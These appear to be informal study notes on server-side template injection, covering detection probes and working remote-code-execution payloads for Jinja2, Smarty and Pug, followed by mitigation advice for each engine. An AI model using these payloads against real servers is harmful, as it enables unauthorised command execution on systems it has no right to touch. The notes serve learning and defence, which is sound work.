SSTI is a vulnerability where the user input is unsafely incorporated into a server-side template, allowing attackers to inject and execute arbitrary code on the server
# Template engine
a template engine is like a machine that helps build webpages dynamically
it works with these steps
- template: the engine uses a pre-designed template with placeholders like {{name}} for dynamic content
- user input: the engine receives user input and stores it in a variable
- combination: the engine combines the template with the user input, replacing the placeholder with the actual data
- output: the engine generates a final dynamic web page with the user's input inserted into the template
# Python
## Jinja2/Twig
these two template engines have similar syntax an behavior, making them somewhat difficult to differentiate but here is a payload that can differentiate them
```
{{7*'7'}}
```
in Twig the output would be 49
but in Jinja2 the output would be 7777777
### Jinja2 specifically
when you confirm that jinja is being used you can do the following
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
if you want to pass arguments pass a list instead
## Jade/Pug
pug, formerly known as Jade, uses a different syntax for handling expression which is the following
```
#{7*7}
```
this would return 49
unlike Jinja2 or Twig, Pug/Jade allows direct js execution within its templates
# PHP
## Smarty
smarty is a powerful php engine that supports dynamic execution of php functions within its templates
```
{system("ls")}
```
# NodeJS 🤮
## Pug
pug formally known as jade is a high performance template engine used in jode.js for blah blah blah blah, anyway its security vulnerabilities primarily stem from its capability to interpolate JS code within template variables. This feature, designed for dynamic content generation can be exploited maliciously if user inputs are blah blah blah blah, holy yap
as with the flippin previous you can use the same syntax
```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```
# Mitigation
## jinja2
- **Sandbox Mode**: Enable the sandboxed environment in Jinja2 to restrict the template's ability to access unsafe functions and attributes. This prevents the execution of arbitrary Python code
- **Input Sanitisation**: Always sanitize inputs to escape or remove potentially dangerous characters and strings that can be interpreted as code. This is crucial when inputs are directly used in template expressions
- - **Template Auditing**: Regularly review and audit templates for insecure coding patterns, such as directly embedding user input without sanitisation
## Jade (Pug)
- **Avoid Direct JavaScript Evaluation**: Restrict or avoid using Pug’s ability to evaluate JavaScript code within templates. Use alternative methods to handle dynamic content that do not involve direct code execution
- **Validate and Sanitize Inputs**: Ensure all user inputs are validated against a strict schema and sanitized before they are rendered by the template engine. This reduces the risk of malicious code execution
- **Secure Configuration Settings**: Use environment settings and configuration options that minimize risks, such as disabling any features that allow script execution
## Smarty
- **Disable `{php}` Tags**: Ensure that `{php}` tags are disabled in Smarty configurations to prevent the execution of PHP code within templates
- **Use Secure Handlers**: If you must allow users to customize templates, provide a secure set of tags or modifiers that they can use, which do not allow direct command execution or shell access
- **Regular Security Reviews**: Conduct security reviews of the template files and the data handling logic to ensure that no unsafe practices are being used. Regularly update Smarty to keep up with security patches